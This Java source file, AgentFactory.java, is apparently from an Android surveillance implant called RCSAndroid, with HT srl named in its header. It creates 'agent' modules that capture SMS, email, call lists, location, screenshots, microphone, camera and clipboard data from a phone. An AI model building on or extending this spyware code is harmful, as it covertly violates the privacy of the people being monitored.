/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : AgentFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.ht.RCSAndroidGUI.agent;

import com.ht.RCSAndroidGUI.interfaces.AbstractFactory;

import android.util.Log;

public class AgentFactory implements AbstractFactory<AgentBase, AgentType> {
	private static final String TAG = "AgentFactory";

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	public AgentBase create(AgentType type) {
		AgentBase a = null;

		switch (type) {
			case AGENT_SMS:
				a = new AgentMessage();
				break;

			case AGENT_TASK:
				a = new AgentTask();
				break;

			case AGENT_CALLLIST:
				a = new AgentCallList();
				break;

			case AGENT_DEVICE:
				a = new AgentDevice();
				break;

			case AGENT_POSITION:
				a = new AgentPosition();
				break;

			case AGENT_CALL:
				break;

			case AGENT_CALL_LOCAL:
				break;

			case AGENT_KEYLOG:
				break;

			case AGENT_SNAPSHOT:
				a = new AgentSnapshot();
				break;

			case AGENT_URL:
				break;

			case AGENT_IM:
				break;

			case AGENT_EMAIL:
				a = new AgentMessage();
				break;

			case AGENT_MIC:
				a = new AgentMic();
				break;

			case AGENT_CAM:
				a = new AgentCamera();
				break;

			case AGENT_CLIPBOARD:
				a = new AgentClipboard();
				break;

			case AGENT_CRISIS:
				a = new AgentCrisis();
				break;

			case AGENT_APPLICATION:
				a = new AgentApplication();
				break;

			case AGENT_LIVEMIC:
				break;

			default:
				Log.d("QZ", TAG + " Error (factory): unknown type");
				break;
		}

		return a;
	}

}
